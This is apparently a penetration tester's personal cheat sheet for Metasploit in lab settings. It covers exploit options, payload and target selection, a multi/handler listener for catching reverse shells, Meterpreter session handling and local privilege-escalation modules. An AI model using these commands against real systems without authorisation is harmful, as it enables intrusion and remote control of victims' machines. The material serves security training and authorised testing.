# Metasploit
This page is just basic stuff I forget all the time. There are other Metasploit tips in sections where it's relevant.

## Advanced options
Metasploit is so derp-easy that you can usually exploit a machine by typing `show options`, setting your machine with `LHOST` and setting the target with `RHOST`. 

Sometimes an exploit doesn't work because of an unusual configuration or path issue, which you can set with:
```show advanced``` 

There is usually a `verbose` setting in this section. Setting `verbose = true` may help you understand why an exploit isn't working.

You might also need to set the correct target:
```
show targets
set target [target number]
``` 

[MSO8-067](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi) sometimes needs this because the module can't always identify the exact operating system version and language pack. 

Sometimes you'll run into something weird like an Apache web server running on Windows, so the default Unix payload won't work. Check and modify the payload:
```
show payloads
set payload [whatever]
```

## Meterpreter
To catch shells using meterpreter:
```
use exploit/multi/handler
set LHOST [attack machine]
set LPORT 443
run
```
If you're VPNed into a lab, pay attention to the IP address. I've noticed that the first time this module runs, it defaults to `eth0` and you have to restart it to use something like `tap0`.

### Sessions
Meterpreter is nice because it lets you maintain multiple shell sessions and use local exploits against them. For example, the [Rejetto exploit](https://www.exploit-db.com/exploits/39161/) always seems to fire a few times and with meterpreter, you can catch every shell session with a single listener.

To list active sessions:
```
sessions -l
```
To enter a session:
```
sessions -i [session number]
```
To enter a shell from a session (not use meterpreter commands):
```
shell
```
To exit the shell and return to meterpreter, type `exit`.

### Local exploits
Once you have a meterpreter shell, you can scan for local exploits and run them. 

To access local exploits, you'll need to jump out of meterpreter using `background` and select one with the `use` command:
```
meterpreter > background
use /exploit/windows/whatever
show options
[edit options as needed]
set SESSION [session number]
run
```
You'll need to select a session where the exploit will be run.

The one useful exception I've noticed is the exploit suggester for Windows which can be run from the meterpreter prompt:

```
meterpreter > run /post/multi/recon/local_exploit_suggester
```

